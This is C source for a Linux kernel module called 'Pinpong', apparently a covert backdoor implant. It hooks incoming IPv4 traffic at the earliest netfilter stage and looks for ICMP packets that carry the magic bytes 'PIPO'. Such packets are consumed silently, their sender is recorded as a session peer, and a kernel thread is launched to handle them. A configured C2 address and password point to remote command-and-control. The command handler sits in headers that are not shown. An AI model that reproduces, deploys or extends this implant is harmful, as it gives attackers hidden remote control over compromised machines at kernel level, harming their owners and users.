#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/icmp.h>
#include <linux/if_ether.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/etherdevice.h>
#include <linux/kthread.h>
#include <linux/workqueue.h>

#include "config.h"
#include "context.h"
#include "response.h"
#include "handler.h"

#define ICMP_PROTOCOL 1

static struct Context *context;

static void init_globals(void) {
    memset(context, 0, sizeof(struct Context));
    context->config.c2addr = in_aton(C2_ADDR);
    strcpy(context->config.password, PASSWORD);

    printk(KERN_INFO "[CONFIG] c2addr %d, password %s", context->config.c2addr, context->config.password);
    return;
};

void hexdump(void *ptr, size_t len) {
    unsigned char *buf = (unsigned char *)ptr;
    for (size_t i = 0; i < len; i++) {
        printk(KERN_INFO "%p %02X ",&buf[i], buf[i]);
        if ((i + 1) % 16 == 0)
            printk(KERN_INFO "\n");
    }
    printk(KERN_INFO "\n");
}
static void work_handler(struct work_struct *work)
{
    printk(KERN_INFO "Entered work handler");
    context->threadid = kthread_run(handle_packet, context, "big bombaclad");
}

// Function to be called for incoming ICMP packets
static unsigned int icmp_hook_func(void *priv, struct sk_buff *recv_skb, const struct nf_hook_state *state) {    
    struct ethhdr *recv_ethh;
    struct iphdr *recv_iph;
    struct icmphdr *recv_icmph;
    unsigned char *recv_icmp_data; // Pointer to the ICMP data
    int icmp_data_len; // Length of the ICMP data
    

    int response_status;
    uint8_t dest_addr[ETH_ALEN];

    if (!recv_skb)
        return NF_ACCEPT;

    recv_ethh = eth_hdr(recv_skb);
    recv_iph = ip_hdr(recv_skb);

    if (recv_iph->protocol == IPPROTO_ICMP) {
        recv_icmph = icmp_hdr(recv_skb);

        if (recv_icmph) {
            recv_icmp_data = (unsigned char *)(recv_icmph + 1);
            icmp_data_len = recv_skb->len - sizeof(struct iphdr) - sizeof(struct icmphdr);
            // printk(KERN_INFO "Received ICMP packet (type %d, ip src, %u, ip src %u, data %s)\n", recv_icmph->type, recv_iph->saddr, recv_iph->daddr, recv_icmp_data);

            if (memcmp(recv_icmp_data, "PIPO", 4) == 0 && context->handler_handling == 0) {
                if (context->in_session && (context->saddr != context->session_saddr)) {
                    printk("Failed one");
                    return NF_ACCEPT;
                };
                memcpy(context->smac, recv_ethh->h_dest, ETH_ALEN);
                memcpy(context->dmac, recv_ethh->h_source, ETH_ALEN);
                context->saddr = recv_iph->daddr;
                context->daddr = recv_iph->saddr;
                memcpy(context->recv_data, recv_icmp_data, icmp_data_len);
                printk(KERN_INFO "Correct Magic");

                schedule_work(&context->my_work);
                return NF_STOLEN;
            } else {
                //printk(KERN_INFO "[WRONG PASSWORD] Received ICMP packet (type %d, ip src, %d, ip dst %d, data %s)\n", recv_icmph->type, recv_iph->saddr, recv_iph->daddr, recv_icmp_data);

            }
        }
    }
    return NF_ACCEPT; // Accept the packet
}
// static int handler_thread(void *data) {
//     struct Context* c =  (struct Context*)data;
//     printk(KERN_INFO "Entered thread");
//     while (c->shutdown != 1) {
//         if (context->to_send == 1) {
//             printk(KERN_INFO "%d", context->to_send);
//             send_icmp("Password accepted", 17, c);
//         }
//         context->to_send = 0; 
//         msleep(1000);
//     }
//     printk(KERN_INFO "Got shutdown on thread");
//     return 0;
// }

static struct nf_hook_ops icmp_hook_ops = {
    .hook = icmp_hook_func,
    .pf = NFPROTO_IPV4,
    .hooknum = NF_INET_PRE_ROUTING, // Hook to intercept packets just before routing
    .priority = NF_IP_PRI_FIRST,
};

static int __init hello_init(void) {

    context = kmalloc(sizeof(struct Context), GFP_KERNEL);

    init_globals();
    printk(KERN_INFO "Successfully malloced to global objects");

    INIT_WORK(&context->my_work, work_handler);

    nf_register_net_hook(&init_net, &icmp_hook_ops);
    printk(KERN_INFO "Registered hook");
    
    
    //printk(KERN_INFO "Registered thread");
    
    
    return 0;
}

static void __exit hello_exit(void) {

    if (context->handler_handling) {
        kthread_stop(context->threadid);
        //context->threadid = NULL;
    }
    nf_unregister_net_hook(&init_net, &icmp_hook_ops);

    flush_work(&context->my_work);
    kfree(context);
    printk(KERN_INFO "Goodbye, world!\n");
}


module_init(hello_init);
module_exit(hello_exit);


MODULE_LICENSE("GPL");
MODULE_AUTHOR("cb4ng");
MODULE_DESCRIPTION("Pinpong");
